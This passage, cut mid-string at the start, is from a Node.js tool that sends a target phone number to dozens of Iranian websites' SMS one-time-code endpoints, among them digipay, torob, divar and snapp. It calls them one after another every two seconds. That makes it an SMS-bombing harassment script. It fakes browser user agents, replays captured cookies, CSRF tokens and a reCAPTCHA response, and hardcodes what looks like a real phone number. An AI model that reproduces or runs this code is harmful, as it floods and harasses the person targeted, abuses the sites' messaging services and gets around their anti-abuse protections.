YUTDiAkEXji_D11DaN3SfiPxPFqLndpQb0CswHdlokkQMSsRzZQ5I6_uO_DEaXeozaA4bP_aAo2D9nHKwlkL7Q",
            };

            await axios
              .post(url, body)
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => wisgoon"));
          };

          const digipay = async () => {
            const url = "https://www.mydigipay.com/digipay/api/users/send-sms";
            const body = {
              cellNumber: number,
              device: {
                deviceId: "d520c7a8-421b-4563-b955-f5abc56b97ec",
                deviceModel: "Windows/Firefox",
                deviceAPI: "WEB_BROWSER",
                osName: "WEB",
              },
            };
            const header = {
              "User-Agent": genUserAgent(),
            };
            await axios
              .post(url, body, { headers: header })
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => digipay"));
          };

          const farvi = async () => {
            const url = "https://farvi.shop/api/v1/sessions/login_request";
            const body = { mobile_phone: number };

            await axios
              .post(url, body)
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => farvi"));
          };

          const torob = async () => {
            const url = `https://api.torob.com/v4/user/phone/send-pin/?phone_number=${number}`;
            await axios
              .get(url)
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error => torob"));
          };

          const sheypoor = async () => {
            const url = "https://www.sheypoor.com/api/v10.0.0/auth/send";
            const body = { username: number };
            await axios
              .post(url, body)
              .then((res) => console.log(res.status))
              .catch(() => console.log("Error"));
          };

          const achar = () => {
            const url = "https://api.achareh.co/v2/accounts/login/?web=true";
            const body = { phone: `98${withoutZero}` };
            const header = {
              'Host': "api.achareh.co",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain,*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://achareh.co/",
              "Content-Length": "24",
              'Origin': "https://achareh.co",
              'Connection': "keep-alive",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-site",
              'TE': "trailers",
              "Content-Type": "application/json",
              'Approle': "web",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };
            methods.postHeade(url, body, header, "Error => achar");
          };

          const a4baz = () => {
            methods.post(
              "https://clientapi.a4baz.com/v1/auth",
              { mobile: number },
              "Error => a4baz"
            );
          };

          const okcs = async () => {
            const url = "http://my.okcs.com/api/check-mobile";
            const body = {
              mobile: number,
              "g-recaptcha-response":
                "03AFcWeA7zXLzRa1c-RFesZKYlQJqjcmX4bCIYerMDEEE4a7FIkUzHmkRVzK1QH_a_l6lh-iERVP3pfrhhZJ2RbJS2-etHJtUTVUu-gbaJ4YLAyihj5p_QeaalHZIbJqoL80m2HQ9dw86GVjXKlaQ0wMl6_AL4Y0EK8wF7e33P2T32eh8TlNH9xzJJY2LtP2mhBNYEel_elsww5mLpiNxKLSDKtN9ugGJ3kNx6rIPcCEfzI09-p6erE7xK3Tvg_XgQ5Efd6i5KSqNiGOTa3R5jK4I1SuCG0PDir_tgwQcj13LCmDwhGTkj1ZYR6ICQLc2qAcNEMVHx5mUPw3VXgzyYo7QpM0K1dWWbWGRqI6dBXYCT2_LCe-d-X62thkONcaduoGjUtXg6EZxd5XZfbGPfdgPqtyt8-QaxuGwqMpRzJoq0oqkdyEgfSEOaCz2VD9Xm-G855rrg18fH157pdT4-PQPQO3kS4fpwszypoEPuZJiVC5-B4oQRvBPgssbviLMEMMbdUpXP6xpzuKXh3HCYCBjA-W8aFlxCseTQevv91swuK8YHkw4arJ_E_A-x0UyBXJoW6nCcSvx2EHHuJ1yJwkJFoD1TFUNS5IHcAiCKR2CMLH1xHZLHGXT5lCTaj8w0pLsUNOSc4U2WfARYOoR6kbhLORaiDzGEUA",
            };
            const header = {
              'Host': "my.okcs.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate",
              'Referer': "http://my.okcs.com/",
              "Content-Length": "726",
              'Origin': "http://my.okcs.com",
              'Connection': "keep-alive",
              'Cookie': " _ga_PNX9G068M6=GS1.1.1710014673.1.1.1710015109.60.0.0; _ga=GA1.1.748086928.1710014673; XSRF-TOKEN=eyJpdiI6IjhiaGlBc0VMbCtYb0pQc2JYTGdRM2c9PSIsInZhbHVlIjoidCt0dkJlM0s4M1F1UVNqK3R1QUswencwcFB0N1ROZ1JCdFBiRHpMaDNoOWpPSTgyT0xzaHAyTEV3SSt0WW9HQ2RPS2g1U2J3N09mckRMVGV0aDV0clFhUmN0YktiZXdlWUxlMUdKZ3htRk83MG15RHZ5WWRYd0x3dEhJZXJPUFIiLCJtYWMiOiI4NWU2NGI0ZWE3YjMxMTlmNDI2NmVmODJmOTlmZjM1NGExYzFiNzVkYTEwNjUzZDg5MDlhMGNlYWJiNDUxY2NhIiwidGFnIjoiIn0%3D; myokcs_session=eyJpdiI6IkdQbmhkMGxjaUl6Zy8rMTdWWUF0b0E9PSIsInZhbHVlIjoidWtVam5sQnhGV3llUlRWeXdjTkRuZStiSnNCa2Y0UXlDUkl2eWNNNzVLTmhkOHB3dE5xQ0pYcEV6VW1BTVhucGJRcVMvVm9lb3UrK1FkRnhXSE5KdERTcHNPdWpHMjBJWktEQkpxTWdNSVF1TDZlcEZRRWowWEVkQW9RNHVIcGUiLCJtYWMiOiIwMjc1Y2ZjZTJiZDYzZTg3YTY2ZmM0MjI2MDhhYTljMzhiZDllYjMzNzY0N2E1NjZlYzdkY2NjMWUyZjIxMmFiIiwidGFnIjoiIn0%3D; _ga_GBBD0TFHQ4=GS1.1.1710065107.1.0.1710065107.0.0.0; analytics_session_token=c711fafb-c29c-467f-df47-8099a9481457; analytics_token=f4fa83eb-2501-b635-1e73-1e6a486a0942; yektanet_session_last_activity=3/10/2024; _yngt_iframe=1; _yngt=3fe34f7e-e3f83-3117c-cd3df-f2c2f3ebf1b3f",
              "X-Requested-With": "XMLHttpRequest",
              "Content-Type": "application/json;charset=utf-8",
              "X-XSRF-TOKEN": "eyJpdiI6IjhiaGlBc0VMbCtYb0pQc2JYTGdRM2c9PSIsInZhbHVlIjoidCt0dkJlM0s4M1F1UVNqK3R1QUswencwcFB0N1ROZ1JCdFBiRHpMaDNoOWpPSTgyT0xzaHAyTEV3SSt0WW9HQ2RPS2g1U2J3N09mckRMVGV0aDV0clFhUmN0YktiZXdlWUxlMUdKZ3htRk83MG15RHZ5WWRYd0x3dEhJZXJPUFIiLCJtYWMiOiI4NWU2NGI0ZWE3YjMxMTlmNDI2NmVmODJmOTlmZjM1NGExYzFiNzVkYTEwNjUzZDg5MDlhMGNlYWJiNDUxY2NhIiwidGFnIjoiIn0=",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios.post(url, body, { headers: header }).then((res) => console.log(res.statusText)).catch(() => console.log('okala error'))

          };

          const gapfilm = () => {
            const url = "https://core.gapfilm.ir/api/v3.1/Account/Login";
            const body = { Type: 3, Username: number };
            const header = {
              "User-Agent": genUserAgent(),
            };
            const errorMessage = "Error => gapfilm";

            methods.postHeade(url, body, header, errorMessage);
          };

          const azki = () => {
            const url =
              "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/";
            const body = { phoneNumber: number };
            const header = {
              'Host': "www.azki.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain,*/*",
              "Accept-Language": "fa",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.azki.com/",
              "Content-Length": "29",
              'Origin': "https://www.azki.com",
              'Connection': "keep-alive",
              'Cookie': "_gcl_au=1.1.1840613866.1710067781; cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiIxOWUwMjliZS1lOTRmLTQ2MDktOGE5Yi1kZmVkNjRmNWUxNzkiLCJpbmJveF9pZCI6M30.Cm9Sc3REjwwrSHI37xzR3Aot_D3p82SngnaWZ1hTEg8; analytics_session_token=59b84e4f-1488-c542-5232-81091f2df1e1; analytics_token=72bd135d-da93-9ad6-4750-927419c77587; yektanet_session_last_activity=3/10/2024; _yngt_iframe=1; _ga_43SWEC8CH3=GS1.1.1710067781.1.0.1710067791.50.0.0; _ga=GA1.1.294426658.1710067781; _yngt=0ca256ad-d9334-4c1e3-3893a-acc21f60f9764; _clck=uevaaz%7C2%7Cfjy%7C0%7C1530; mp_998a65f2ebe6e503c6059187cc9ae771_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18e27fb99901ee2-0f5bff28da04b9-e565623-1fa400-18e27fb99911ee2%22%2C%22%24device_id%22%3A%20%2218e27fb99901ee2-0f5bff28da04b9-e565623-1fa400-18e27fb99911ee2%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _clsk=1qokrq6%7C1710067785457%7C1%7C1%7Cm.clarity.ms%2Fcollect",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              "Content-Type": "application/json",
              'device': "web",
              'deviceID': "6",
              "user-token": "I9ki6SKPLxczCdWdlXlrL0xHWm0yTVWxzdu8CXEVcHTRpRD2l0u7SUOnZvmielwl",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };
            const errorMessage = "Error => azki";

            methods.postHeade(url, body, header, errorMessage);
          };

          const ayantech = () => {
            const url =
              "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode";
            const body = {
              Parameters: {
                MobileNumber: number,
                ApplicationType: "Web",
                ApplicationUniqueToken: null,
                ApplicationVersion: "1.0.0",
              },
            };
            const header = {
              'Host': "application2.billingsystem.ayantech.ir",
              "User-Agent": genUserAgent(),
              'Accept': "application/json,text/plain,*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/json",
              "Content-Length": "128",
              'Referer': "https://ghabzino.com/",
              'Origin': "https://ghabzino.com",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "cross-site",
              'Connection': "keep-alive",
              'TE': "trailers",
            };

            methods.postHeade(url, body, header, "Error => ayantech");
          };

          const drsaina = () => {
            const url =
              "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation";
            const body = `__RequestVerificationToken=CfDJ8LAHk8-NI5hBqr_jKzR9ilJpkdNH__VBIJqARm60YZkJCslnI4Pv6bzn6FWoTR4ImOOBG1YEgvpeU7ujoMLYF1ZRgiSIGNK6O2O4Zpm6wDd3MlWLcvs3bCPkEFUmnSLTqUiMOzft-4eWGpVs_tZE7Wc&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber=${number}&confirmCode=&fullName=&Password=&Password2=`;
            const header = {
              'Host': "www.drsaina.com",
              "User-Agent": genUserAgent(),
              'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation",
              "Content-Length": "345",
              'Origin': "https://www.drsaina.com",
              'Connection': "keep-alive",
              'Cookie': "_gcl_aw=GCL.1710069560.EAIaIQobChMI8fjQwsnphAMVj4ZoCR2nJANEEAAYASAAEgKPefD_BwE; _gcl_au=1.1.673549404.1710069560; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=aa08941d-010c-0026-53f7-247ccc7e333c; analytics_token=024c0363-d748-a2a0-417e-fa8533362444; yektanet_session_last_activity=3/10/2024; _yngt_iframe=1; _ga_TZ59YW6Z4C=GS1.1.1710069560.1.1.1710069606.14.0.0; _ga=GA1.2.1829714022.1710069561; _yngt=e828ffc6-64b18-8c8a7-7532a-a792a78d8ed33; _gid=GA1.2.1283802251.1710069562; _gac_UA-126198313-1=1.1710069596.EAIaIQobChMI8fjQwsnphAMVj4ZoCR2nJANEEAAYASAAEgKPefD_BwE; _gat_UA-126198313-1=1; _clck=1a4ob75%7C2%7Cfjy%7C0%7C1530; _clsk=1aahw6u%7C1710069598539%7C2%7C1%7Cm.clarity.ms%2Fcollect; .AspNetCore.Antiforgery.I9F8r9FFRTA=CfDJ8LAHk8-NI5hBqr_jKzR9ilKDfIQaCitq7y_DX9SYCDtPM0HCA9DT3vRtaNmPC4O7e6uBHUbPL9NBtZrd-MIO3n1iRbGAdn73l2t5kH0MT1D-wPqjk57c-KzGfM1czc4bwoQGm3tzhTnHpKosD-L-cD8",
              "Upgrade-Insecure-Requests": "1",
              "Sec-Fetch-Dest": "document",
              "Sec-Fetch-Mode": "navigate",
              "Sec-Fetch-Site": "same-origin",
              "Sec-Fetch-User": "?1",
              'TE': "trailers",
              "Content-Type": "application/x-www-form-urlencoded",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };
            const errorMessage = "Error => drsaina";

            methods.postHeade(url, body, header, errorMessage);
          };

          const limoome = () => {
            const url = "https://limoome.com/forum/wp-admin/admin-ajax.php";
            const body = `digits_reg_username=kakdkasak&digt_countrycode=%2B98&phone=${withoutZero}&digits_reg_password=sdddsdsdd32&digits_process_register=1&sms_otp=&digits_otp_field=1&instance_id=22707201f3d5361ee09456664ce3b689&optional_data=optional_data&action=digits_forms_ajax&type=register&dig_otp=otp&digits=1&digits_redirect_page=%2F%2Flimoome.com%2Fforum%2Fregister%2F&_wpfnonce=839a7f0d3f&_wp_http_referer=%2Fforum%2Fregister%2F&digits_form=fb7ffa2118&_wp_http_referer=%2Fforum%2Fregister%2F&digbuilder_form=1&post_id=437&form_id=6275ec9&container=&sub_action=sms_otp`;
            const header = {
              "User-Agent": genUserAgent(),
            };
            const error = "Error => limoome";
            methods.postHeade(url, body, header, error);
          };

          const mihanpezeshk = () => {
            const url = "https://www.mihanpezeshk.com/Verification_Patient";
            const body = `_token=Ffq57CJLsYTlmV6m7WXIyb9q7fQnNHhI1yaiz6bm&recaptcha=&mobile=${number}`;
            const header = {
              'Host': "www.mihanpezeshk.com",
              "User-Agent": genUserAgent(),
              'Accept': "text / html, application / xhtml + xml, application / xml; q = 0.9, image / avif, image / webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.mihanpezeshk.com/loginPatient",
              "Content-Type": "application/x-www-form-urlencoded",
              "Content-Length": "77",
              'Origin': "https://www.mihanpezeshk.com",
              "Alt-Used": "www.mihanpezeshk.com",
              'Connection': "keep-alive",
              'Cookie': "XSRF-TOKEN=eyJpdiI6Ik5qakxQVFFzdCtaZExKOVdmdjZwanc9PSIsInZhbHVlIjoid1MrZ3c2UFZ6bURoNlhmZ0tcL2JLXC9SVHZzampYUWlMc2VqZFA0ZjNteXJCRm03citMemhQYUd4TTVyNDJKakFRIiwibWFjIjoiNTg5ZWUxODM5OWQwNjM3NjRiMTRhZDMxYzUzOTZhZThhMGVlMGUyNzkyNTJjZGZiZDY1NGU1NzA1NDMxZTgyOCJ9; laravel_session=eyJpdiI6InFvSXhTTmhZd0VFODNvMStLXC9mYWFRPT0iLCJ2YWx1ZSI6ImlcL0RpaHErdUhpMlUySWtIYXBLK2tWR3N3QmF4WXRVeHI4VXNwdmxrWDhBdkxTa3REaVVxakZSWGg5QzdnODVQIiwibWFjIjoiZjlkOGExZmUzYTE3M2E3MTIwNWRhYTczMWQ1NDU4NTkxMmNlYzcxYzg4YjlmODM5NDkyYjNhZjMxNmI0ZDVlYiJ9; _ga_CGK4G3GQG4=GS1.1.1710095376.1.1.1710095382.0.0.0; _ga=GA1.1.1799344391.1710095377; cf_clearance=oWYDuGhx45hZ2kp96leeU2Ilkn3knpOWgxeX9D01bT8-1710095376-1.0.1.1-AKLkUpQD.gdQISHhDz.omMxg3Sc1JHTySrSqGfsy_xzNCmMb8XG045Dvxugd5E63ekvRmMFdBTuBMQEccetsDg; _gcl_au=1.1.402030972.1710095378",
              "Upgrade-Insecure-Requests": "1",
              "Sec-Fetch-Dest": "document",
              "Sec-Fetch-Mode": "navigate",
              "Sec-Fetch-Site": "same-origin",
              "Sec-Fetch-User": "?1",
              'TE': "trailers",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            methods.postHeade(url, body, header, "Error => mihanpezeshk");
          };

          const lendo = () => {
            const url = "https://api.lendoco.ir/api/customer/auth/send-otp";
            const body = { mobile: number };
            const header = {
              "User-Agent": genUserAgent(),
            };
            const errorMessage = "Error => lendo";
            methods.postHeade(url, body, header, errorMessage);
          };

          const hiword = () => {
            const url = "https://hiword.ir/wp-admin/admin-ajax.php";
            const body = `action=digits_check_mob&countrycode=%2B98&mobileNo=9164097710&csrf=c334d3e99d&login=2&username=&email=DSADADSA%40gmail.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=sSS&digregcode=%2B98&digits_reg_mail=${withoutZero}&digregscode2=%2B98&mobmail2=DSADADSA%40gmail.com&digits_reg_password=&dig_otp=&code=&dig_reg_mail=DSADADSA%40gmail.com&dig_nounce=c334d3e99d`;
            const header = {
              "User-Agent": genUserAgent(),
            };
            const errorMessage = "Error => hiword";
            methods.postHeade(url, body, header, errorMessage);
          };

          const shahrfarsh = () => {
            const url = "https://shahrfarsh.com/Account/Login";
            const body = `phoneNumber=${number}`;
            const header = {
              "User-Agent": genUserAgent(),
            };
            const errorMessage = "Error => shahrefarsh";
            methods.postHeade(url, body, header, errorMessage);
          };

          const takfarsh = () => {
            const header = {
              "User-Agent": genUserAgent(),
            };
            methods.postHeade(
              "https://takfarsh.com/wp-admin/admin-ajax.php",
              `action=mreeir_send_sms&mobileemail=09164097710&userisnotauser=&type=mobile&security=27f192c641`,
              header,
              "Error => takfarsh"
            );
          };

          function callMethodsSequentially() {
            const allMethods = [
              modiseh,
              watchonline,
              padmira,
              tagmond,
              shixon,
              digistyle,
              gheysi,
              chitoorsh,
              kukala,
              banimode,
              pindo,
              zigap,
              victorshop,
              giftcardstore,
              gifkart,
              saatchico,
              behtarino,
              javaherbazar,
              balad,
              classino,
              snap,
              barghman,
              mahdimaleki,
              zarinpal,
              basalam,
              gamegifts,
              abantether,
              deniizshop,
              flightio,
              zarinplus,
              tap30,
              divar,
              bama,
              snappfood,
              alibaba,
              snappMarket,
              mrbilit,
              snapptrip,
              filmnet,
              DrDr,
              okala,
              takshopaccessorise,
              bitpin,
              otaghak,
              shab,
              bit24,
              itoll,
              wisgoon,
              digipay,
              farvi,
              torob,
              sheypoor,
              achar,
              a4baz,
              okcs,
              gapfilm,
              azki,
              ayantech,
              drsaina,
              limoome,
              mihanpezeshk,
              lendo,
              hiword,
              shahrfarsh,
              takfarsh,
            ];

            // console.log(`APIS: ${allMethods.length}`)

            function delayExecution(allMethods, delay) {
              return new Promise((resolve) => {
                setTimeout(() => {
                  allMethods();
                  resolve();
                }, delay);
              });
            }

            async function executeMethods() {
              for (let i = 0; i < allMethods.length; i++) {
                await delayExecution(allMethods[i], 2000);
                // console.log(allMethods[i])
              }
            }

            executeMethods();
          }

          callMethodsSequentially();

        }
      });

    }


    Send();

  },

  Setup() {
    const info = fs
      .readFileSync(path.join(__dirname, "../about/info.txt"))
      .toString();
    console.log(info);
  },
};

module.exports = CreateApp;
